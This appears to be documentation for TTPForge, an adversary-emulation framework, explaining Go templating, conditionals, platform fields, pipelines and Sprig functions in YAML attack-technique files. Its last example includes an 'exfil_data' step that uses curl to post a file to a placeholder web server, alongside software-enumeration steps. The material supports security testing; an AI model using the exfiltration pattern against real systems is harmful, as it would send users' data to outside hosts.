# Enhancing Your TTPs with Golang Templating Features

The Go templating library is a powerful feature TTPForge utilizes
 to preprocess forges. Developers are able to make use of these
 features to easily add dynamic runtime behavior to their TTPs.
 Templating supports conditional logic, which can be leveraged to
 create sophisticated and context-aware TTPs. This document illustrates
 some key elements and examples of useful template functions that
 can be used within TTPs.

## Actions

Actions are control structures enclosed in double curly braces `{{ }}`.
 TTPForge ttps are pre-processed using Golang's template package to
 expand all argument values prior to execution. TTPForge arguments
 utilize this feature and arguments are made available during
 template rendering as `{{ .Args.arg_name }}` allowing access
 to the `arg_name` field.

### Example Actions

```yaml
# ...
args:
  - name: name
    description: This argument is of default type `string`
    default: Bob
  - name: age
    type: int
    default: 25
steps:
  - name: print_name
    print_str: |
      My name is: {{.Args.name}
  - name: birthday
    print_str: |
      Today, I am {{add .Args.age 1}}
# ...
```

## Conditional Logic

Golang templates support `if`, `else`, and `range` statements
for conditional logic and iteration, allowing users to
control execution flow effectively.

These statements follow the following format:

- `{{ if <conditional> }}`

- `{{ else if <conditional> }}`

- `{{ else <conditional> }}`

And require `{{ end }}` to close the block.

### Example Conditionals

```yaml
# ...
args:
  - name: brew
    description: list installed software via brew
    type: bool
    default: false

  - name: mdfind
    description: list installed software via mdfind
    type: bool
    default: false
steps:
  {{ if .Args.brew }}
  - name: brew
    description: Enumerating software installed using brew.
    inline: brew list
  {{ else if .Args.mdfind }}
  - name: mdfind
    description: Enumerating software installed using mdfind.
    inline: mdfind "kMDItemContentType == 'com.apple.application-bundle'"
  {{ else }}
  - name: invalid
    description: Invalid Option
    print_str: "Invalid Option, Try Again!"
  {{ end }}
# ...
```

## Platform

TTPForge provides a `Platform` struct that contains information
about the current platform being executed on. TTPs can be
created platform agnostically with the use of the following fields:

- `OS`: The operating system of the current platform.

- `Arch`: The architecture of the current platform.

### Example Platform

<!-- markdownlint-disable MD013 -->
```yaml
# ...
requirements:
  platforms:
    - os: linux
    - os: darwin
    - os: windows
steps:
  - name: hello_world
    inline: |
      {{ if eq .Platform.OS "windows" }}
        Write-Host "Hello Windows!"
      {{ else if eq .Platform.OS "linux" }}
        echo "Hello Linux!"
      {{ else if eq .Platform.OS "darwin" }}
        echo "Hello macOS!"
      {{ end }}
  - name: download_ttpforge
    description: Downloads the platform-appropriate release of TTPForge
    fetch_uri: https://github.com/facebookincubator/TTPForge/releases/
    download/v1.2.3/TTPForge_1.2.3_{{ .Platform.OS }}_{{ .Platform.Arch }}.tar.gz
    location: ttpforge.tar.gz
# ...
```
<!-- markdownlint-enable MD013 -->

## Pipelines

Pipelines are a series of commands chained together,
where the output of one command is the input to the next.
They are used within actions, e.g., `{{ .Args.Name | printf "%q" }}`.

> **NOTE:** piped parameters are always provided as the last parameter
> in the list. So in the following example the result of randBytes will
> be the second argument to cat
>
> `{{ randBytes 16 | cat "Random Bytes:" }}`

### Example Pipelines

```yaml
# ...
args:
  - name: input_file
    type: path
steps:
  - name: create_result_dir
    description: Uses the path functions and pipelines to manipulate path arguments
    inline: |
      mkdir {{ osDir .Args.input_file | printf "%q/results" }}
      cd {{ osDir .Args.input_file | printf "%q/results" }}
  - name: generate_rand_file
    description: Generate a random base64-encoded file of a given size
    inline: |
      echo "{{ randBytes 1024 | b64enc }}" > rand.txt
# ...
```

## Sprig Functions

Some useful functions that can be used to improve TTPs include:

- `env`: Retrieves environment variables

- `fail`: Causes the template to fail with an error message during the
preprocessing step

- `randBytes`: Generates random bytes

- `b64enc`: Encodes data to base64

- `urlParse`: Parses a URL string

- `urlJoin`: Joins URL components

Sprig also provides functions for working with strings that
follow file path conventions. These can be useful for working
with file paths in TTPForge:

- `osBase`: Returns the last element of a path

- `osClean`: Cleans up a path by removing unnecessary elements

- `osDir`: Returns the directory part of a path

- `osExt`: Returns the file extension of a path

### Example Functions

```yaml
# ...
args:
  - name: webserver
    default: example.com
steps:
  - name: generate_rand_file
    description: Generate a random base64-encoded file of a given size
    inline: |
      echo "{{ randBytes 1024 | b64enc }}" > rand.txt
  - name: exfil_data
    description: Exfltrate data to target
    inline: |
      curl -F 'data=rand.txt' {{ .Args.webserver }}
# ...
```

## References

**More Information for Reference: [Go Templating Documentation]("https://pkg.go.dev/text/template")**

**More Information for Reference: [Sprig Function Documentation]("https://masterminds.github.io/sprig/")**
